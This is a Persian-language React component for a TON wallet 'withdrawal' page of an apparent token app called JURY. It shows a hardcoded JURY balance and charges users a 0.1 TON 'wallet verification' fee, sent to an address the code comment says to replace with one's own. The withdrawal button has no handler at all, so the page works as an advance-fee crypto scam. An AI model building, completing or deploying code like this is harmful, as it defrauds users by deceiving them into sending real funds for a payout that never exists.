"use client";

import { useState } from "react";
import { Wallet as WalletIcon, ArrowUpRight, ArrowDownLeft, Clock, ShieldCheck, CheckCircle2, Lock } from "lucide-react";
import { TonConnectButton, useTonConnectUI, useTonAddress } from "@tonconnect/ui-react";

export default function Wallet() {
  const [tonConnectUI] = useTonConnectUI();
  const userFriendlyAddress = useTonAddress();
  const [isVerified, setIsVerified] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // آدرس مقصد برای دریافت 0.1 TON (باید با آدرس کیف پول خودت عوض کنی)
  const platformWallet = "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

  const handleVerify = async () => {
    if (!userFriendlyAddress) {
      alert("لطفا ابتدا کیف پول خود را متصل کنید!");
      return;
    }

    try {
      setIsLoading(true);
      
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [
          {
            address: platformWallet,
            amount: "100000000", // 0.1 TON
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      setIsVerified(true);
      alert("ولت شما با موفقیت تایید شد! 🎉");
      
    } catch (e) {
      console.error(e);
      alert("تراکنش لغو شد یا با خطا مواجه شد.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <main className="flex flex-col items-center pt-6 px-4 pb-28 min-h-screen text-white bg-[#050505]">
      
      {/* هدر */}
      <div className="w-full max-w-md flex items-center gap-3 mb-6">
        <div className="w-10 h-10 rounded-xl bg-[#E6B333]/10 border border-[#E6B333]/30 flex items-center justify-center text-[#E6B333]">
          <WalletIcon size={24} />
        </div>
        <div>
          <h1 className="text-lg font-bold text-white">کیف پول و برداشت</h1>
          <p className="text-xs text-gray-400">برداشت مستقیم توکن‌های JURY به کیف پول TON</p>
        </div>
      </div>

      {/* کارت موجودی */}
      <div className="w-full max-w-md bg-[#111111] border border-[#8A6D1F]/50 rounded-2xl p-5 mb-4 relative overflow-hidden">
        <div className="absolute top-0 right-0 w-24 h-24 bg-[#E6B333]/5 blur-3xl rounded-full"></div>
        
        <p className="text-xs text-gray-400 mb-1">موجودی آماده برداشت</p>
        <p className="text-3xl font-extrabold text-white mb-1">
          12,587.42 <span className="text-lg text-[#E6B333]">JURY</span>
        </p>
        <p className="text-[10px] text-gray-500 mb-4">موجودی داخل حساب شما محفوظ است</p>

        <div className="flex gap-2">
          <TonConnectButton className="flex-1" />
        </div>
      </div>

      {/* بخش وریفای ولت */}
      {!isVerified ? (
        <div className="w-full max-w-md bg-gradient-to-br from-[#1a1500] to-[#111111] border border-[#E6B333]/50 rounded-2xl p-5 mb-4 shadow-[0_0_20px_rgba(230,179,51,0.15)] relative overflow-hidden">
          <div className="flex items-center gap-3 mb-3">
            <div className="w-10 h-10 rounded-full bg-[#E6B333]/20 flex items-center justify-center text-[#E6B333]">
              <ShieldCheck size={20} />
            </div>
            <div>
              <h2 className="text-sm font-bold text-white">تایید کیف پول (Verification)</h2>
              <p className="text-[10px] text-gray-400">برای برداشت، ابتدا باید کیف پول خود را تایید کنید</p>
            </div>
          </div>
          
          <div className="bg-black/40 rounded-xl p-3 mb-4 border border-white/5">
             <div className="flex justify-between text-xs mb-2">
               <span className="text-gray-400">هزینه تایید</span>
               <span className="text-[#E6B333] font-bold">0.1 TON</span>
             </div>
             <p className="text-[9px] text-gray-500 leading-relaxed">
               این مبلغ برای جلوگیری از حملات ربات‌ها و اسپم است. پس از تایید، امکان برداشت JURY برای شما فعال می‌شود.
             </p>
          </div>

          <button 
            onClick={handleVerify}
            disabled={isLoading}
            className="w-full bg-gradient-to-r from-[#B8860B] via-[#F5D061] to-[#B8860B] text-black font-bold text-sm py-3 rounded-xl border border-[#FFF8DC]/50 active:scale-95 transition flex items-center justify-center gap-2 disabled:opacity-50"
          >
            {isLoading ? "در حال پردازش..." : "پرداخت 0.1 TON و تایید ولت"}
          </button>
        </div>
      ) : (
        <div className="w-full max-w-md bg-green-500/10 border border-green-500/30 rounded-2xl p-4 mb-4 flex items-center gap-3">
          <CheckCircle2 className="text-green-500" size={24} />
          <div>
            <p className="text-sm font-bold text-green-500">کیف پول شما تایید شده است!</p>
            <p className="text-[10px] text-gray-400">حالا می‌توانید درخواست برداشت ثبت کنید.</p>
          </div>
        </div>
      )}

      {/* اطلاعات برداشت */}
      <div className="w-full max-w-md bg-[#111111] border border-white/10 rounded-2xl p-4 mb-4">
        <h2 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
          <ArrowUpRight size={16} className="text-[#E6B333]" /> درخواست برداشت JURY
        </h2>
        
        <div className="space-y-3">
          <div className="flex justify-between items-center text-xs">
            <span className="text-gray-400 flex items-center gap-1"><Clock size={12}/> مدت زمان پرداخت</span>
            <span className="text-white">۱ تا ۲۴ ساعت</span>
          </div>
          <div className="flex justify-between items-center text-xs">
            <span className="text-gray-400 flex items-center gap-1"><ShieldCheck size={12}/> حداقل برداشت</span>
            <span className="text-white">۱۰۰۰ JURY</span>
          </div>
          <div className="flex justify-between items-center text-xs">
            <span className="text-gray-400 flex items-center gap-1"><ArrowDownLeft size={12}/> کارمزد شبکه</span>
            <span className="text-white">۵٪</span>
          </div>
        </div>

        {/* شرایط جدید: هولد ۸۸ توکن */}
        <div className="mt-4 bg-[#E6B333]/10 border border-[#E6B333]/20 rounded-xl p-3 flex items-start gap-2">
          <Lock size={16} className="text-[#E6B333] mt-0.5 shrink-0" />
          <p className="text-[10px] text-gray-300 leading-relaxed">
            برای برداشت، باید حداقل <span className="text-[#E6B333] font-bold">۸۸ توکن JURY</span> در کیف پول خود هولد کنید.
          </p>
        </div>

        {/* دکمه برداشت */}
        <button 
          disabled={!isVerified}
          className={`w-full font-bold text-sm py-3 rounded-xl mt-4 border transition ${
            isVerified 
              ? "bg-gradient-to-r from-[#E6B333] to-[#F5D061] text-black border-[#FFF8DC]/50 shadow-[0_0_15px_rgba(230,179,51,0.3)]" 
              : "bg-[#1A1A1A] text-gray-500 border-white/5 cursor-not-allowed"
          }`}
        >
          {isVerified ? "ثبت درخواست برداشت" : "برداشت (نیاز به تایید ولت)"}
        </button>
      </div>

      {/* تاریخچه */}
      <div className="w-full max-w-md">
        <h2 className="text-sm font-bold text-white mb-2 px-1 flex items-center gap-2">
          <Clock size={16} className="text-[#E6B333]" /> تاریخچه برداشت‌ها (0)
        </h2>
        <div className="bg-[#111111] border border-white/10 rounded-2xl p-6 text-center">
          <p className="text-gray-500 text-xs">هنوز تراکنشی ثبت نشده است.</p>
        </div>
      </div>

    </main>
  );
}
